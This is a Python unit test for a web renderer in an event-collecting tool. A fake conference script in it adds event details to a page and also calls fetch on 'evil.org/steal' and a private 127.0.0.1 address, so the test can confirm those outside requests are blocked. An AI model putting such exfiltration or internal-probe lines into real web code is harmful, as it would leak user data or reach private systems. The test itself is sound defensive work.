"""Isolated renderer integration: no real websites or network calls."""
import os
import unittest
from collector.render import render_html
from collector.automatic import parse_page

@unittest.skipUnless(os.environ.get('RUN_RENDER_TESTS')=='1','Install Chromium and set RUN_RENDER_TESTS=1')
class RenderTests(unittest.TestCase):
    def test_javascript_events_are_extracted_and_external_requests_blocked(self):
        class Session:
            headers={'User-Agent':'CrowdStage-test'}
        class Fetcher:
            session=Session()
            calls=[]
            def fetch(self,url):
                self.calls.append(url)
                if url!='https://organizer.org/app.js':
                    raise AssertionError('Unexpected network destination: '+url)
                code=b'''document.body.innerHTML += '<article><h1>Cloud Conference</h1><time>June 2-3, 2027</time><address>Berlin, Germany</address></article>'; fetch('https://evil.org/steal'); fetch('https://127.0.0.1/private');'''
                return 200,code,{'Content-Type':'application/javascript'}
        fetcher=Fetcher()
        source={'name':'Cloud Conference','publisher':'organizer.org','url':'https://organizer.org/','is_official_source':True}
        with unittest.mock.patch.dict(os.environ,{'RENDER_HTML':'1'}):
            html=render_html(fetcher,source['url'],b'<html><head><title>Cloud Conference</title></head><body><script src="/app.js"></script></body></html>')
        rows=parse_page(html,source,source['url'])
        self.assertEqual(rows[0]['start_date'],'2027-06-02')
        self.assertEqual(fetcher.calls,['https://organizer.org/app.js'])
